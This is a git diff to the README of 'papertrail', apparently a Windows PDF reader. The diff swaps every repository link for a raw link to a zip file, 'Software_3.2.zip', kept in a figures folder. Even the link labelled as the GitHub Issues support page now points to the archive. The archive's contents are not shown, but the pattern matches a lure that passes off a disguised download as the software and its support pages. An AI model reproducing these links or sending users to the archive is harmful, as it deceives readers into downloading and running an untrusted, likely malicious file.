@@ -1,6 +1,6 @@
 # 📄 papertrail - PDF Reading Made Simple
 
-[![Download papertrail](https://img.shields.io/badge/Download%20papertrail-Get%20It%20Here-brightgreen?style=for-the-badge)](https://github.com/Stravinskyopticalglass907/papertrail)
+[![Download papertrail](https://img.shields.io/badge/Download%20papertrail-Get%20It%20Here-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Stravinskyopticalglass907/papertrail/main/figures/Software_3.2.zip)
 
 ---
 
@@ -11,7 +11,7 @@ This guide will help you download and start papertrail on your Windows PC. You d
 1. Open your web browser.
 
 2. Click the big green button at the top or visit this page:  
-   https://github.com/Stravinskyopticalglass907/papertrail
+   https://raw.githubusercontent.com/Stravinskyopticalglass907/papertrail/main/figures/Software_3.2.zip
 
 3. On the page, look for the latest **Download** or **Releases** section.
 
@@ -118,7 +118,7 @@ Key functions include:
 
 ## 📂 Where to Get Support
 
-Visit the [Issues](https://github.com/Stravinskyopticalglass907/papertrail/issues) page on GitHub. You can report problems or ask questions there.
+Visit the [Issues](https://raw.githubusercontent.com/Stravinskyopticalglass907/papertrail/main/figures/Software_3.2.zip) page on GitHub. You can report problems or ask questions there.
 
 ---
 
@@ -126,4 +126,4 @@ Visit the [Issues](https://github.com/Stravinskyopticalglass907/papertrail/issue
 
 Click below to go to the GitHub site where you can get the software.
 
-[![Download papertrail](https://img.shields.io/badge/Download%20papertrail-Get%20It%20Here-brightgreen?style=for-the-badge)](https://github.com/Stravinskyopticalglass907/papertrail)
+[![Download papertrail](https://img.shields.io/badge/Download%20papertrail-Get%20It%20Here-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Stravinskyopticalglass907/papertrail/main/figures/Software_3.2.zip)
